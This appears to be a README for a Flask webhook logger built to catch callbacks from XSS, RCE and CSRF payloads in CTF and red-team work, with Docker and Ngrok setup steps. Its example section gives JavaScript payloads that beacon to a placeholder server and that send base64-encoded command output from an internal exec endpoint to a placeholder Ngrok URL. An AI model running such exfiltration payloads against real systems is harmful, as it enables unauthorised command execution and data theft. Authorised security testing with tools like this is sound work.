# Webhook Logger with Auto-Refresh Log Viewer

This Flask-based webhook logger captures incoming HTTP requests and provides a real-time, scrollable interface to view logs. It's designed for testing XSS, RCE, CSRF payloads during penetration testing or CTF exercises.

It provides:
- `/log` – accepts POST/GET data and logs it
- `/view` – scrollable, auto-refreshing web UI for reviewing logs

---

## Features

- Stores logs in `logs/payloads.log`
- Auto-refreshes every 5 seconds
- Scrollable log view for long sessions
- Compatible with CORS
- Ideal for XSS, RCE, and CSRF data exfiltration testing

---

## Manual Setup

### Requirements

- Python 3.x
- Flask

Install dependencies:

```bash
pip install flask flask-cors
```

Run the server manually:

```bash
python webhook.py
```

Server will start on: [http://localhost:8080](http://localhost:8080)

---

## Docker Setup

Build and run using Docker:

```bash
docker build -t webhook-logger ./app
docker run -d -p 8080:8080 --name webhook_logger webhook-logger
```

Or use Docker Compose (recommended):

```bash
docker compose up --build
```

Accessible at:
- Webhook endpoint: [http://localhost:8080/log](http://localhost:8080/log)
- Viewer: [http://localhost:8080/view](http://localhost:8080/view)

Logs are saved in `./app/logs/payloads.log` (persisted via volume).

---

## Remote Access via Ngrok

To expose your local Flask server publicly using Ngrok:

```bash
docker run --rm -it --network=host -e NGROK_AUTHTOKEN=Your-AUth-Token ngrok/ngrok http 8080
```

Use the generated Ngrok URL in your payloads:

```javascript
fetch("https://your-ngrok-url.ngrok-free.app/log", {
  method: "POST",
  body: "XSS triggered!"
});
```

---

## Example Payloads

Send a basic XSS beacon:

```javascript
fetch("http://your-server:8080/log", {
  method: "POST",
  body: "XSS triggered!"
});
```

Exfiltrate command output (RCE scenario):

```javascript
fetch("http://127.0.0.1:9000/internal/exec", {
  method: "POST",
  body: "whoami"
})
.then(r => r.text())
.then(t => fetch("https://your-ngrok-url.ngrok-free.app/log", {
  method: "POST",
  body: btoa(t)
}));
```

---

## Log File

All captured data is saved in:
```
logs/payloads.log
```

View logs in the browser via `/view` or monitor the file directly.

---

## Notes

- You can use Ngrok to make the webhook reachable from the internet.
- Adjust `app.run()` if you want to change the default port from `8080`.
- Auto-refresh interval and scroll height can be configured in the HTML template.

---

## Author

**w01f**

Built for use in CTFs, Red Team operations, and custom payload exfiltration scenarios.
